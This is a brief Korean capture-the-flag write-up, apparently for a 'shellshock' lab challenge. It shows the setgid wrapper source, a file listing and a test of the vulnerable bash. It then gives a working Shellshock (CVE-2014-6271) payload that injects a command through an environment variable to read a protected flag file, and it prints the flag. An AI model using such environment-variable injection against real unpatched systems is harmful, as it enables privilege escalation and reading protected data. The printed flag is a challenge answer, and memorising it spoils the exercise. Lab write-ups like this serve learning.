```
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}

```
```
shellshock@ubuntu:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c

```

셸쇼크 테스트
```
shellshock@ubuntu:~$ env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test"
vulnerable
this is a test
```
`/home/shellshock/bash`는 취약한 쉘임을 알 수 있다.

```
shellshock@ubuntu:~$ env x='() { :;}; cat /home/shellshock/flag' ./bash -c "echo this is a test"
cat: /home/shellshock/flag: Permission denied
Segmentation fault
```
권한이 부족하여 flag를 bash를 통해 열 수는 없다.

따라서 ./shellshock에서 권한 상승을 해 주므로
```
shellshock@ubuntu:~$ env x='() { :;}; /bin/cat /home/shellshock/flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```
